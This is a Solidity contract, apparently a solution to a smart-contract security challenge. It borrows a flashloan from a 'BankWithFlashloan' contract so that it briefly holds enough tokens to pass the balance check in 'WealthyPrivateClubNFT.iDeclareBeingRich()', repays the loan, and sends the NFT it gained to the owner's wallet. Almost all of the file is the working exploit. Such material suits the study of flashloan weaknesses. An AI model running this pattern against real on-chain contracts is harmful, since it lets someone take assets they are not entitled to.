// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./BankToken.sol";
import "./BankWithFlashloan.sol";
import "./WealthyPrivateClubNFT.sol";
/*
 * Iteract with BankToken, BankWithFlashloan and WealthyPrivateClubNFT contracts. 
 * Use getNFT() to call flashloan() , and get the tokens so that msg.sender can pass the (wealthyPrivateClubNFT).iDeclareBeingRich() and get NFT.
 * After contract get NFT, use transferNFT() to transfer NFT to our own account.
 */

contract GetNFT is IERC721Receiver,Ownable {
    address public wealthyPrivateClubNFT;// Address of WealthyPrivateClubNFT
    address public bankWithFlashloan;// Address of BankWithFlashloan
    address public bankToken;// Address of BankToken

    constructor() {
       
    }
    function setWealthyPrivateClubNFT(address _wealthyPrivateClubNFT) public onlyOwner {
        wealthyPrivateClubNFT = _wealthyPrivateClubNFT;
    }
    function setBankWithFlashloan(address _bankWithFlashloan) public onlyOwner {
        bankWithFlashloan = _bankWithFlashloan;
    }
    function setBankToken(address _bankToken) public onlyOwner {
        bankToken = _bankToken;
    }
    // Write BankWithFlashloan's IFlashloanExecutor so that we can interact with BankWithFlashloan and call flashloan
    function executeWithMoney(uint256 amount) external { 
        WealthyPrivateClubNFT(wealthyPrivateClubNFT).iDeclareBeingRich();
        IERC20(bankToken).transfer(msg.sender, amount);
    }
    // To call flahloan() and borrow _loanAmount token
    function getNFT(uint256 _loanAmount) payable public onlyOwner {
        BankWithFlashloan(bankWithFlashloan).flashloan(address(this), _loanAmount);
    }
    // Transfer NFT to our own wallet address
    function transferNFT(address to, uint256 tokenId) public onlyOwner {
        IERC721(wealthyPrivateClubNFT).safeTransferFrom(address(this), to, tokenId);
    }
    // In the IERC721Receiver contract that is called when an NFT is successfully received.
    function onERC721Received(address, address, uint256, bytes calldata) external override pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

}